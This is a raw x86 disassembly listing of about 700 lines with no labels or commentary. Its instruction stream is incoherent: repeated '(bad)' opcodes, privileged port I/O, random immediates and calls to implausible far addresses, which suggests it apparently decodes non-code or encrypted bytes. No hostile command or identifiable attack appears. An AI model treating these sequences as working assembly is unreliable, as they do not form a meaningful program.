  412c04:	sbb    BYTE PTR [esp+esi*2-0x67],al
  412c08:	shr    DWORD PTR [eax+edx*2],cl
  412c0b:	out    dx,eax
  412c0c:	jno    0x412c7d
  412c0e:	or     BYTE PTR ds:0x4ff2bedb,dl
  412c14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c15:	mov    esp,?
  412c17:	pop    esi
  412c18:	fstp   TBYTE PTR [esi+edx*1+0x7c39336d]
  412c1f:	pop    ebp
  412c20:	sub    al,BYTE PTR [ecx-0x2f]
  412c23:	inc    ebp
  412c24:	and    al,0x41
  412c26:	sub    ecx,DWORD PTR [eax+ebx*1-0x25]
  412c2a:	scas   eax,DWORD PTR es:[edi]
  412c2b:	pop    ebp
  412c2c:	mov    ah,0xaa
  412c2e:	ins    BYTE PTR es:[edi],dx
  412c2f:	es (bad) 
  412c31:	cld    
  412c32:	imul   esp,edi,0xffffffe8
  412c35:	popf   
  412c36:	adc    DWORD PTR [ebx+0x65],ecx
  412c39:	mov    esp,0xf60f3daf
  412c3e:	jle    0x412cae
  412c40:	adc    BYTE PTR [edi],0xbc
  412c43:	pop    eax
  412c45:	cdq    
  412c46:	pushf  
  412c47:	xchg   BYTE PTR [eax-0x48],ch
  412c4a:	int    0x1c
  412c4c:	jp     0x412cc1
  412c4e:	inc    edi
  412c4f:	arpl   ax,cx
  412c51:	fisub  WORD PTR [edi]
  412c53:	mov    esi,0xd8d05976
  412c58:	fmul   st,st(3)
  412c5a:	inc    ecx
  412c5b:	mov    bh,0x96
  412c5d:	push   esi
  412c5e:	mov    al,ds:0xc14b521d
  412c63:	sar    BYTE PTR [ecx+0x48],1
  412c66:	leave  
  412c67:	lea    esi,[esi]
  412c69:	pop    ss
  412c6a:	and    edi,DWORD PTR [esi-0x6b3f6520]
  412c70:	psubsb mm0,mm3
  412c73:	aaa    
  412c74:	inc    edx
  412c75:	and    al,0x85
  412c77:	loop   0x412cac
  412c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7a:	aaa    
  412c7b:	call   0xeb4ed268
  412c80:	outs   dx,BYTE PTR ds:[esi]
  412c81:	push   edi
  412c82:	inc    ebp
  412c83:	sbb    esp,esi
  412c85:	std    
  412c86:	xor    dl,dh
  412c88:	adc    bh,ch
  412c8a:	rcr    DWORD PTR [ebx],1
  412c8c:	dec    esp
  412c8d:	test   BYTE PTR [eax],cl
  412c8f:	in     al,dx
  412c90:	mov    dh,0xa7
  412c92:	jl     0x412c33
  412c94:	pop    ebp
  412c95:	pop    ebx
  412c96:	popf   
  412c97:	scas   eax,DWORD PTR es:[edi]
  412c98:	jge    0x412c35
  412c9a:	icebp  
  412c9b:	and    al,0x53
  412c9d:	dec    edx
  412c9e:	or     dh,BYTE PTR [edx-0x64ca3d1]
  412ca4:	loopne 0x412ccc
  412ca6:	mov    esi,0x4afc4417
  412cab:	xor    ch,BYTE PTR [esi+edx*4-0x80]
  412caf:	xchg   esp,eax
  412cb0:	sbb    eax,0xadbbbad5
  412cb5:	sbb    al,0x88
  412cb7:	frstor [ebx-0x36de64b1]
  412cbd:	popf   
  412cbe:	xor    ch,al
  412cc0:	dec    ebx
  412cc1:	adc    DWORD PTR [edi],edx
  412cc3:	mov    al,ds:0xbabc3f88
  412cc8:	cs push ds
  412cca:	xlat   BYTE PTR ds:[ebx]
  412ccb:	xor    BYTE PTR [eax],cl
  412ccd:	in     al,dx
  412cce:	enter  0xb0f1,0x5f
  412cd2:	std    
  412cd3:	fidiv  WORD PTR [edx-0x6c]
  412cd6:	mov    esi,0x14f3a20f
  412cdb:	push   esi
  412cdc:	mov    edx,0xd8e014ea
  412ce1:	sbb    eax,0x9e0b2f4e
  412ce6:	push   edx
  412ce7:	idiv   BYTE PTR [bp+di+0x76]
  412ceb:	int    0xdf
  412ced:	mov    ds:0x38151214,al
  412cf2:	cmp    BYTE PTR [eax-0xd],dl
  412cf5:	mul    BYTE PTR [eax]
  412cf7:	out    0x54,eax
  412cf9:	add    esi,DWORD PTR [edi+0x3fcef68e]
  412cff:	push   ds
  412d00:	mov    ch,0xe9
  412d02:	in     al,dx
  412d03:	dec    ecx
  412d04:	add    al,0xb8
  412d06:	jp     0x412d10
  412d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d09:	sbb    BYTE PTR [edi],al
  412d0b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  412d0d:	pop    es
  412d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d0f:	outs   dx,BYTE PTR ds:[esi]
  412d10:	call   0xab4a575e
  412d15:	outs   dx,BYTE PTR ds:[esi]
  412d16:	mov    esp,0xece4c880
  412d1b:	shl    ebp,1
  412d1d:	sbb    edx,ecx
  412d1f:	stos   BYTE PTR es:[edi],al
  412d20:	inc    esi
  412d21:	xor    dl,bl
  412d23:	gs jecxz 0x412cdd
  412d26:	add    esi,ebx
  412d28:	rcr    DWORD PTR es:[eax],1
  412d2b:	push   esi
  412d2c:	frstor [ebp+0x7d07515a]
  412d32:	call   0x7a53:0xf1f614f4
  412d39:	popa   
  412d3a:	jg     0x412d8d
  412d3c:	cmp    BYTE PTR [edi-0x1fd27005],ch
  412d42:	lahf   
  412d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d44:	add    edx,edi
  412d46:	jl     0x412d19
  412d48:	jo     0x412dc8
  412d4a:	xor    esi,ebx
  412d4c:	mov    esi,0xa0544dec
  412d51:	jmp    0x412d53
  412d53:	xlat   BYTE PTR ds:[ebx]
  412d54:	scas   al,BYTE PTR es:[edi]
  412d55:	bound  edi,QWORD PTR [eax-0x611a7dd9]
  412d5b:	adc    ecx,edi
  412d5d:	push   cs
  412d5e:	scas   al,BYTE PTR es:[edi]
  412d5f:	inc    ebx
  412d60:	pop    edx
  412d61:	lods   al,BYTE PTR ds:[esi]
  412d63:	adc    al,0x1
  412d65:	pop    ds
  412d66:	dec    ebp
  412d67:	into   
  412d68:	pop    edi
  412d69:	clc    
  412d6a:	(bad)  
  412d6b:	fcmovnu st,st(3)
  412d6d:	cmp    al,0x86
  412d6f:	call   0x1428dca2
  412d74:	and    DWORD PTR [ebx+eiz*1-0x5c],ebp
  412d78:	push   ss
  412d79:	jnp    0x412dde
  412d7b:	(bad)  
  412d7c:	mov    dh,0x3d
  412d7e:	scas   eax,DWORD PTR es:[edi]
  412d7f:	outs   dx,DWORD PTR ds:[esi]
  412d80:	or     DWORD PTR [bx+di+0x33],ebx
  412d84:	pop    ebp
  412d85:	mov    dh,0x23
  412d87:	push   edx
  412d88:	or     edx,DWORD PTR [ebx-0x247317de]
  412d8e:	add    al,0x7a
  412d90:	in     al,0x91
  412d92:	data16 fsub DWORD PTR ds:0x71206113
  412d99:	jno    0x412d8f
  412d9b:	xchg   BYTE PTR [edi-0x155ddac8],dh
  412da1:	call   0xa94b05af
  412da6:	ret    
  412da7:	dec    esp
  412da8:	dec    ebx
  412da9:	lea    esi,[esi+0x3f]
  412dac:	dec    ecx
  412dad:	(bad)  
  412dae:	pusha  
  412daf:	icebp  
  412db0:	and    BYTE PTR [ebp+0x1949ff6f],dh
  412db6:	lds    edx,FWORD PTR [esi]
  412db8:	out    0xeb,eax
  412dba:	dec    edi
  412dbb:	mov    fs,WORD PTR [esi+0x16]
  412dbe:	lds    edx,FWORD PTR [edi+eiz*8]
  412dc1:	jge    0x412e11
  412dc3:	push   es
  412dc4:	sub    BYTE PTR [ebx+0x3a2d8198],bh
  412dca:	lods   eax,DWORD PTR ds:[esi]
  412dcb:	add    BYTE PTR [esi+0x722dc50e],dl
  412dd1:	fisubr WORD PTR [eax-0x7f]
  412dd4:	mov    ebp,0xccacd77e
  412dd9:	div    DWORD PTR [edx]
  412ddb:	mov    edx,0x2fd5d5a
  412de0:	lods   eax,DWORD PTR ds:[esi]
  412de1:	pop    esp
  412de2:	iret   
  412de3:	adc    BYTE PTR [ebx],cl
  412de5:	push   es
  412de6:	mov    ds:0xd8d3d3b4,eax
  412deb:	sub    DWORD PTR [eax-0x4d],0xaac32db0
  412df2:	pop    edi
  412df3:	sti    
  412df4:	jg     0x412e61
  412df6:	(bad)  
  412df7:	iret   
  412df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df9:	rcl    BYTE PTR [esi+0x69],cl
  412dfc:	push   ecx
  412dfd:	lods   al,BYTE PTR ds:[esi]
  412dfe:	or     al,0xa
  412e00:	and    bl,BYTE PTR [edx-0x12030710]
  412e06:	stos   DWORD PTR es:[edi],eax
  412e07:	jmp    0xb170bc59
  412e0c:	iret   
  412e0d:	out    0x1a,al
  412e0f:	dec    ecx
  412e10:	loop   0x412e3b
  412e12:	jb     0x412e5b
  412e14:	jmp    DWORD PTR cs:[eax-0xc9ee9c7]
  412e1b:	enter  0x589a,0x37
  412e1f:	sbb    cl,BYTE PTR [ecx]
  412e21:	cmp    al,0x45
  412e23:	scas   eax,DWORD PTR es:[edi]
  412e24:	cmc    
  412e25:	aam    0x8c
  412e27:	add    ecx,DWORD PTR [esi]
  412e29:	sub    DWORD PTR [esi-0x9],ecx
  412e2c:	xchg   edx,eax
  412e2d:	mov    ecx,0x84d984c7
  412e32:	aaa    
  412e33:	dec    ebp
  412e34:	sbb    ecx,DWORD PTR [eax-0x4b]
  412e37:	aaa    
  412e38:	mov    BYTE PTR [ecx],bh
  412e3a:	cli    
  412e3b:	or     eax,0x1dbf6c95
  412e40:	jno    0x412e68
  412e42:	aad    0x45
  412e44:	xchg   BYTE PTR [esi+0x2474da83],dl
  412e4a:	pop    ds
  412e4b:	in     eax,dx
  412e4c:	adc    eax,0xb7d31d2b
  412e51:	push   edi
  412e52:	dec    eax
  412e53:	sub    bh,BYTE PTR [esi]
  412e55:	inc    BYTE PTR [ebx]
  412e57:	or     eax,0x2dcb8262
  412e5c:	aam    0x87
  412e5e:	mov    cl,BYTE PTR [ebx-0x43]
  412e61:	nop
  412e62:	cmp    BYTE PTR [ecx],dl
  412e64:	mov    ebx,0xbc0d1aad
  412e69:	mov    ch,0x23
  412e6b:	fcomp  QWORD PTR [ebp+ebx*8+0x10]
  412e6f:	rcl    DWORD PTR [eax+0x62f3d45a],0xf4
  412e76:	jae    0x412e1d
  412e78:	jg     0x412ef2
  412e7a:	fisub  WORD PTR [eax+ecx*1]
  412e7d:	(bad)  
  412e7e:	dec    ebx
  412e80:	jl     0x412ef5
  412e82:	xchg   ax,ax
  412e84:	sub    BYTE PTR [esi],cl
  412e86:	mov    ds:0x614c1082,eax
  412e8b:	rcr    DWORD PTR ds:0xbb8b62ec,cl
  412e91:	(bad)  
  412e92:	mov    ebp,0xb4578705
  412e97:	mov    WORD PTR [ecx-0x517d7789],gs
  412e9d:	and    eax,DWORD PTR [edx]
  412e9f:	mov    ebx,0x799bb3b0
  412ea4:	les    ebp,FWORD PTR [ebx-0x28887b23]
  412eaa:	sar    DWORD PTR [edx-0x36],0xea
  412eae:	pusha  
  412eaf:	aad    0xcf
  412eb1:	xor    eax,DWORD PTR [ebp+0x4e]
  412eb4:	xlat   BYTE PTR ds:[ebx]
  412eb5:	inc    esp
  412eb6:	lock retf 
  412eb8:	xor    BYTE PTR [ebx+ebp*1-0x38],al
  412ebc:	cdq    
  412ebd:	push   cs
  412ebe:	lahf   
  412ebf:	mov    eax,0xcdbcdc3e
  412ec4:	mov    edi,0x23761eb2
  412ec9:	inc    ecx
  412eca:	out    0x94,eax
  412ecc:	shr    DWORD PTR [ebx],1
  412ece:	xchg   esp,eax
  412ecf:	ss inc edi
  412ed1:	pop    edi
  412ed2:	(bad)  
  412ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ed4:	push   0xfb198fb6
  412ed9:	test   eax,0x669f2590
  412ede:	hlt    
  412edf:	mov    ebx,0x1a20d3f8
  412ee4:	inc    edi
  412ee5:	ret    
  412ee6:	mov    BYTE PTR [ebx+eiz*8],cl
  412ee9:	ror    BYTE PTR [eax-0x44d8275c],1
  412eef:	xchg   esp,eax
  412ef0:	jno    0x412ed7
  412ef2:	inc    edx
  412ef3:	into   
  412ef4:	rol    DWORD PTR [edi+edi*2+0x62db9d98],0x28
  412efc:	sbb    BYTE PTR [edx+0x7115495e],0xd2
  412f03:	sbb    ebx,DWORD PTR [eax-0x29e93820]
  412f09:	push   ebx
  412f0a:	push   esi
  412f0b:	sbb    bh,dl
  412f0d:	int3   
  412f0e:	adc    esi,edi
  412f10:	pop    edi
  412f11:	imul   BYTE PTR [ebp+0x12c58911]
  412f17:	xor    BYTE PTR [edx+0x37ddf954],cl
  412f1d:	mov    ebp,0xeabcc531
  412f22:	push   cs
  412f23:	test   ecx,ecx
  412f25:	fst    DWORD PTR [ebx+0x8c7efb3]
  412f2b:	pop    edx
  412f2c:	xor    eax,0x7829ec46
  412f31:	lds    eax,FWORD PTR [ebx+eax*4]
  412f34:	pop    ecx
  412f35:	or     eax,0x4d072121
  412f3a:	fidiv  WORD PTR [edi]
  412f3c:	or     BYTE PTR [ebp-0x7e],bl
  412f3f:	out    dx,al
  412f40:	enter  0xe973,0x9
  412f44:	xor    eax,0x20062ea9
  412f49:	or     al,0xf5
  412f4b:	call   0x222bd5d
  412f50:	mov    ch,0x30
  412f52:	inc    edi
  412f53:	out    0x19,al
  412f55:	das    
  412f56:	adc    esp,DWORD PTR [ebx+0x1c]
  412f59:	lea    ebp,[ebp+0x4e]
  412f5c:	sub    al,0x4c
  412f5e:	adc    BYTE PTR ds:0x64e4d1f4,dl
  412f64:	test   BYTE PTR [ecx+0xa],0x4f
  412f68:	sub    bl,cl
  412f6a:	lock jecxz 0x412f38
  412f6d:	data16 adc al,0x7e
  412f70:	fld    TBYTE PTR [ebx]
  412f72:	cmp    dl,BYTE PTR [edx]
  412f74:	add    DWORD PTR [ecx+0xb045b56],0x3e
  412f7b:	add    eax,0x5e989e47
  412f80:	repnz inc esi
  412f82:	adc    eax,DWORD PTR [eax-0x7ddf7f80]
  412f88:	add    edi,DWORD PTR [edx-0x13fe954]
  412f8e:	dec    esp
  412f8f:	or     DWORD PTR [eax+0x73],0x8f869c46
  412f96:	pop    eax
  412f97:	adc    ah,dh
  412f99:	(bad)
  412f9e:	pop    edi
  412f9f:	pop    edi
  412fa0:	push   cs
  412fa1:	pop    ss
  412fa2:	(bad)  
  412fa3:	in     eax,dx
  412fa4:	stos   DWORD PTR es:[edi],eax
  412fa5:	(bad)  
  412fa7:	jmp    0xdbddbb4c
  412fac:	or     esp,esp
  412fae:	test   eax,0x7f0a7723
  412fb3:	dec    esi
  412fb4:	inc    ebp
  412fb5:	mov    edx,ss
  412fb7:	out    0x7f,al
  412fb9:	jl     0x412f61
  412fbb:	iret   
  412fbc:	test   eax,0xf70f76f8
  412fc1:	adc    eax,0xeba0eda8
  412fc6:	cwde   
  412fc7:	or     bl,ch
  412fc9:	dec    edi
  412fca:	addr16 out 0x3c,al
  412fcd:	push   cs
  412fce:	jecxz  0x412f74
  412fd0:	arpl   WORD PTR [ebx-0x2a4bb493],cx
  412fd6:	sub    DWORD PTR [ebp+0x24],ebx
  412fd9:	pop    ecx
  412fda:	ds cmp al,0x73
  412fdd:	imul   edi,DWORD PTR [eax],0x20
  412fe0:	sahf   
  412fe1:	cs xchg edx,eax
  412fe3:	lods   eax,DWORD PTR ds:[esi]
  412fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe5:	xor    esp,DWORD PTR [esi-0x7]
  412fe8:	mov    edi,0xfcd67e70
  412fed:	ins    DWORD PTR es:[edi],dx
  412fee:	inc    eax
  412fef:	jnp    0x412f90
  412ff1:	aam    0x35
  412ff3:	into   
  412ff4:	fidivr WORD PTR [eax+esi*4]
  412ff7:	push   ds
  412ff8:	sub    eax,0x5db77ede
  412ffd:	or     BYTE PTR [eax+0x4b14d541],al
  413003:	xchg   esi,eax
  413004:	jne    0x412fc6
  413006:	mov    bh,0xf0
  413008:	imul   esp,DWORD PTR [edx+0x57],0x38
  41300c:	leave  
  41300d:	pop    edi
  41300e:	cmp    al,0xda
  413010:	add    eax,0xae3d065a
  413015:	mov    eax,0xec300be3
  41301a:	rcl    DWORD PTR [ecx-0x681901e2],1
  413020:	mov    dl,0x28
  413022:	ins    BYTE PTR es:[edi],dx
  413023:	jb     0x412fac
  413025:	push   ebp
  413026:	cwde   
  413027:	xchg   ebx,eax
  413028:	fidiv  WORD PTR [ebp-0x3]
  41302b:	nop
  41302c:	jle    0x413097
  41302e:	inc    ecx
  41302f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413030:	add    eax,0x12fc2ba5
  413035:	mov    esi,0x25d4dbfa
  41303a:	pop    ds
  41303b:	pop    ebp
  41303c:	int    0xc7
  41303e:	clc    
  41303f:	popf   
  413040:	ret    0xda0a
  413043:	xchg   edi,eax
  413044:	push   esp
  413045:	jmp    0x412ff5
  413047:	sbb    DWORD PTR [eax-0x4],edi
  41304a:	gs jne 0x4130a8
  41304d:	push   esp
  41304e:	dec    ebx
  41304f:	mov    es,WORD PTR [ecx+0x76fd9e6b]
  413055:	sbb    DWORD PTR [ebp-0x6238991],edx
  41305b:	aad    0x4
  41305d:	jecxz  0x41302b
  41305f:	cmp    ah,BYTE PTR [eax-0x120f24e3]
  413065:	mov    cl,0xad
  413067:	test   esi,eax
  413069:	(bad)
  41306d:	pop    edx
  41306e:	mov    eax,0xc2389d4f
  413073:	xchg   edx,eax
  413074:	push   edx
  413075:	shr    BYTE PTR [edx+0x4572a595],0x81
  41307c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41307d:	cmp    eax,0x189dcdbd
  413082:	mov    WORD PTR [edx+0xc5610f],?
  413088:	lahf   
  413089:	xchg   esp,eax
  41308a:	pusha  
  41308b:	pop    edx
  41308c:	xchg   edx,eax
  41308d:	sbb    edi,DWORD PTR [esi+0xf4a5232]
  413093:	push   ds
  413094:	mov    dh,BYTE PTR [eax]
  413096:	cdq    
  413097:	cmp    BYTE PTR [eax+ecx*8-0x720a16bb],dh
  41309e:	or     BYTE PTR [ecx+0x9],dh
  4130a1:	shl    BYTE PTR [esi],cl
  4130a3:	mul    DWORD PTR [eax]
  4130a5:	push   es
  4130a6:	loopne 0x4130ee
  4130a8:	in     eax,dx
  4130a9:	adc    dh,dl
  4130ab:	jnp    0x41309d
  4130ad:	scas   al,BYTE PTR es:[edi]
  4130ae:	cli    
  4130af:	xchg   ecx,eax
  4130b0:	pop    ebp
  4130b1:	(bad)  
  4130b2:	in     al,dx
  4130b3:	imul   ebx,eax,0xfffffff1
  4130b6:	jbe    0x413121
  4130b8:	or     dl,dl
  4130ba:	cmp    ch,0xb9
  4130bd:	outs   dx,DWORD PTR ds:[esi]
  4130be:	adc    eax,0x95f55158
  4130c3:	daa    
  4130c4:	dec    eax
  4130c5:	mov    eax,0xd70e445e
  4130ca:	push   ss
  4130cb:	or     al,0x1e
  4130cd:	xchg   ecx,eax
  4130ce:	or     BYTE PTR [esi+0x3c],bl
  4130d1:	aas    
  4130d2:	pop    ecx
  4130d3:	sti    
  4130d4:	or     eax,0x7c08d515
  4130d9:	clc    
  4130da:	push   cs
  4130db:	xor    al,0x2d
  4130dd:	retf   0x8cf4
  4130e0:	fcom   DWORD PTR [edx+edx*2]
  4130e3:	fwait
  4130e4:	cmp    al,0xdf
  4130e6:	(bad)  [edi+0x658bd756]
  4130ec:	leave  
  4130ed:	mov    al,0xfe
  4130ef:	sbb    bl,BYTE PTR [ecx+0x5d2e9c59]
  4130f5:	pop    ds
  4130f6:	(bad)  
  4130f7:	sub    al,0x70
  4130f9:	jne    0x413100
  4130fb:	dec    eax
  4130fc:	into   
  4130fd:	and    bh,BYTE PTR ds:0xa3231e05
  413103:	(bad)  
  413104:	test   ebp,0x37933f71
  41310a:	pop    edi
  41310b:	mov    al,0x85
  41310d:	push   ss
  41310e:	add    eax,ebx
  413110:	aad    0x7c
  413112:	cmp    DWORD PTR [eax-0x14b5e13b],ebx
  413118:	pop    ecx
  413119:	cmp    DWORD PTR [edx+0x63],ebp
  41311c:	adc    DWORD PTR ds:0xe061ba4f,0xffffffd2
  413123:	ret    
  413124:	sbb    BYTE PTR [ecx-0x35],ah
  413127:	xor    DWORD PTR [ecx],0x7b
  41312a:	sbb    cl,BYTE PTR [esi+ebx*1]
  41312d:	ds pop esp
  41312f:	nop
  413130:	pushw  0xce57
  413134:	outs   dx,BYTE PTR ds:[esi]
  413135:	lds    ecx,FWORD PTR [eax]
  413137:	dec    ebx
  413138:	dec    esp
  413139:	mov    esi,0xf70731cb
  41313e:	fdivr  st(1),st
  413140:	push   ecx
  413141:	sbb    eax,0xdce35675
  413146:	pop    esp
  413147:	push   ebp
  413148:	dec    BYTE PTR [esi-0x78]
  41314b:	or     DWORD PTR [esi],edx
  41314d:	addr16 sahf 
  41314f:	arpl   WORD PTR [edx],ax
  413151:	or     esi,DWORD PTR [edx+0x6b]
  413154:	dec    edx
  413155:	daa    
  413156:	sbb    BYTE PTR [edi-0xd],bh
  413159:	ins    BYTE PTR es:[edi],dx
  41315a:	pop    ebx
  41315b:	aas    
  41315c:	ficomp DWORD PTR ds:0xf57f6538
  413162:	shl    BYTE PTR [ebp-0x2464a51a],cl
  413168:	scas   eax,DWORD PTR es:[edi]
  413169:	pusha  
  41316a:	xor    BYTE PTR [ebx],0x82
  41316d:	call   0xe562c8dc
  413172:	outs   dx,WORD PTR ds:[esi]
  413174:	push   edi
  413175:	pop    ss
  413176:	repnz mov WORD PTR [ebp-0x19],fs
  41317a:	fild   DWORD PTR gs:[edi-0x2c]
  41317e:	mov    edi,?
  413180:	inc    ebp
  413181:	mov    ds:0xf644e8ce,al
  413186:	leave  
  413187:	mov    cl,0xc6
  413189:	push   ecx
  41318a:	xchg   ecx,eax
  41318b:	ror    DWORD PTR [eax-0x714185ba],1
  413191:	or     bl,BYTE PTR [edi+0x19d8dd0]
  413197:	xor    eax,0xdac20a04
  41319c:	movups xmm6,XMMWORD PTR [ebx]
  41319f:	mov    edx,0x88da75aa
  4131a4:	mov    bl,0x8f
  4131a6:	mov    ebx,0x874a012a
  4131ab:	push   edi
  4131ac:	retf   0x3d53
  4131af:	stos   DWORD PTR es:[edi],eax
  4131b0:	test   eax,0x987f955d
  4131b5:	mov    esp,DWORD PTR [ebx+0x4c]
  4131b8:	xchg   esp,eax
  4131b9:	adc    ah,bl
  4131bb:	dec    esi
  4131bc:	stc    
  4131bd:	adc    bh,BYTE PTR [edi-0x9]
  4131c0:	xor    eax,0x655df649
  4131c5:	add    DWORD PTR [ecx-0x1a],ecx
  4131c8:	pusha  
  4131c9:	or     DWORD PTR [ecx],0x6f88674e
  4131cf:	xchg   DWORD PTR [edi],eax
  4131d1:	(bad)  
  4131d2:	or     ebp,DWORD PTR [ebx]
  4131d4:	jbe    0x413230
  4131d6:	adc    DWORD PTR [eax+0x5a],0x85c6086e
  4131dd:	dec    edi
  4131de:	sub    BYTE PTR [ebp+ebp*4+0x4bd8adb1],0x37
  4131e6:	and    bh,BYTE PTR [esi]
  4131e8:	mov    esp,0x9ab33f93
  4131ed:	push   ebx
  4131ee:	dec    eax
  4131ef:	cmp    esi,DWORD PTR [ebx]
  4131f1:	gs sub al,0xbf
  4131f4:	sub    eax,0xb2284dac
  4131f9:	imul   eax,DWORD PTR [ebp-0x51],0x791612d7
  413200:	test   DWORD PTR ds:0x8a09e320,0xfe7fadbe
  41320a:	cmp    BYTE PTR [eax],0x2c
  41320d:	out    0xce,al
  41320f:	test   DWORD PTR [eax-0x5ae42429],eax
  413215:	sub    al,0x35
  413217:	dec    eax
  413218:	or     eax,0x74514052
  41321d:	mov    ah,0x9d
  41321f:	xchg   ebx,eax
  413220:	jns    0x41329b
  413222:	ror    DWORD PTR [ecx],cl
  413224:	or     bh,ah
  413226:	inc    esi
  413227:	out    0x87,eax
  413229:	imul   ebx,DWORD PTR [eax+0x21],0x97790eee
  413230:	inc    ebx
  413231:	es push esp
  413233:	fidivr DWORD PTR [ecx-0x6a]
  413236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413237:	xchg   DWORD PTR [edi+0x718e83ae],esp
  41323d:	xchg   ebp,esi
  41323f:	int3   
  413240:	lock pop ds
  413242:	scas   al,BYTE PTR es:[edi]
  413243:	cmp    DWORD PTR [ecx],edi
  413245:	pop    ebx
  413246:	imul   ebx,DWORD PTR [ecx-0x551d5dbc],0x8d502aa7
  413250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413251:	xchg   dl,cl
  413253:	add    dl,dh
  413255:	pop    ecx
  413256:	sub    DWORD PTR [eax-0x5cf45598],edx
  41325c:	pop    ss
  41325d:	sub    al,0xbc
  41325f:	cmp    bl,BYTE PTR [ebp-0x4f]
  413262:	fistp  DWORD PTR [esi+0x0]
  413265:	inc    edi
  413266:	loop   0x4132a0
  413268:	je     0x41323c
  41326a:	dec    edx
  41326b:	sbb    BYTE PTR [ebp-0x6eb41b0b],cl
  413271:	push   ecx
  413272:	xor    DWORD PTR [esi+0x67],esi
  413275:	lock shl BYTE PTR [edi+0x1f53e94],cl
  41327c:	es sbb al,0x75
  41327f:	inc    ebp
  413280:	mov    eax,0x2825505d
  413285:	stos   BYTE PTR es:[edi],al
  413286:	pop    esp
  413287:	cmp    ebx,DWORD PTR [ebx+0x472f2173]
  41328d:	rcr    DWORD PTR [eax+0x29],1
  413290:	push   ebx
  413291:	(bad)  
  413292:	sbb    bh,BYTE PTR [edi]
  413294:	jne    0x4132cb
  413296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413297:	xlat   BYTE PTR ds:[ebx]
  413298:	loop   0x4132f8
  41329a:	scas   al,BYTE PTR es:[edi]
  41329b:	add    ch,BYTE PTR [edi-0x1c]
  41329e:	(bad)  
  41329f:	and    ebp,DWORD PTR [ebx+eiz*2+0x5f069952]
  4132a6:	push   cs
  4132a7:	adc    dl,BYTE PTR [edi-0x788087d2]
  4132ad:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b0:	retf   0x766d
  4132b3:	mov    ebp,0x6ff040b2
  4132b8:	xchg   ebp,eax
  4132b9:	sbb    BYTE PTR [ebp+0x4d2b6e98],bh
  4132bf:	das    
  4132c0:	pop    eax
  4132c1:	lahf   
  4132c2:	cs mov esi,0xc798261c
  4132c8:	div    BYTE PTR [ebx-0x3192ccb0]
  4132ce:	mov    dh,0xe2
  4132d0:	cmp    ecx,DWORD PTR [edx]
  4132d2:	outs   dx,BYTE PTR ds:[esi]
  4132d3:	add    al,0xe
  4132d5:	mov    esp,0xe83ca439
  4132da:	mov    ds:0xd4ecd76a,al
  4132df:	or     dh,ah
  4132e1:	sbb    edi,DWORD PTR [eax+0x68758f73]
  4132e7:	push   eax
  4132e8:	sub    al,0x19
  4132ea:	xchg   ebx,eax
  4132eb:	fnsave fs:[eax+0x54]
  4132ef:	in     al,0xda
  4132f1:	test   al,0x84
  4132f3:	lds    edx,FWORD PTR [edx]
  4132f5:	gs aas 
  4132f7:	dec    edx
  4132f8:	pop    ss
  4132f9:	rcr    BYTE PTR [eax],0xff
  4132fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132fd:	adc    eax,0x33f4cf2e
  413302:	pushf  
  413303:	neg    dh
  413305:	and    al,0xcd
  413307:	gs mov ah,0x8a
  41330a:	cmp    bh,bh
  41330c:	fdiv   QWORD PTR [ebx]
  41330e:	inc    esi
  41330f:	fstp   TBYTE PTR [ebp-0x2431a80f]
  413315:	(bad)  
  413316:	jge    0x41330d
  413318:	lds    esp,FWORD PTR [ebx]
  41331a:	int3   
  41331b:	sbb    al,0xf
  41331d:	neg    BYTE PTR [ebp-0x7fef7742]
  413323:	fwait
  413324:	outs   dx,DWORD PTR ds:[esi]
  413325:	ins    BYTE PTR es:[edi],dx
  413326:	gs push bx
  413329:	imul   ebx,DWORD PTR [ebx],0x5d
  41332c:	dec    ebp
  41332d:	cwde   
  41332e:	mov    gs,WORD PTR [eax+0x6a]
  413331:	push   eax
  413332:	jge    0x41339a
  413334:	sahf   
  413335:	pusha  
  413336:	shl    DWORD PTR [eax+0x2c],1
  413339:	stc    
  41333a:	mov    esp,0x3557e00d
  41333f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413340:	shr    DWORD PTR [ebp-0x50],1
  413343:	addr16 or ebp,edi
  413346:	pop    ds
  413347:	dec    ebx
  413348:	push   0x4c1df51a
  41334d:	ins    DWORD PTR es:[edi],dx
  41334e:	fisttp WORD PTR [edi+edi*8-0x36]
  413352:	push   ebx
  413353:	dec    esp
  413354:	pop    eax
  413355:	ds aas 
  413357:	aam    0x5e
  413359:	fcmovu st,st(1)
  41335b:	adc    DWORD PTR [edi-0x1f],edx
  41335e:	retf   
  41335f:	retf   0xf435
  413362:	sbb    DWORD PTR [edi-0x3],0x9d64eb29
  413369:	jmp    0x41332f
  41336b:	call   0x733d:0x961b21c
  413372:	jbe    0x413314
  413374:	and    DWORD PTR [ecx-0x6bb3b169],ebp
  41337a:	ret    0x1ac5
  41337d:	pop    ebp
  41337e:	xor    al,0x16
  413380:	sbb    eax,0xbcc1eb20
  413385:	punpcklbw mm3,mm0
  413388:	jg     0x4133fb
  41338a:	arpl   WORD PTR [ecx],di
  41338c:	cmp    al,0x93
  41338e:	loopne 0x4133ba
  413390:	or     ecx,0xffffffc2
  413393:	cmp    DWORD PTR [edx],0xffbe9b77
  413399:	lods   al,BYTE PTR ds:[esi]
  41339a:	(bad)  
  41339b:	mov    DWORD PTR cs:[esp+edi*4+0x73],esi
  4133a0:	sub    eax,DWORD PTR [ebx+ebx*8+0x706a1da4]
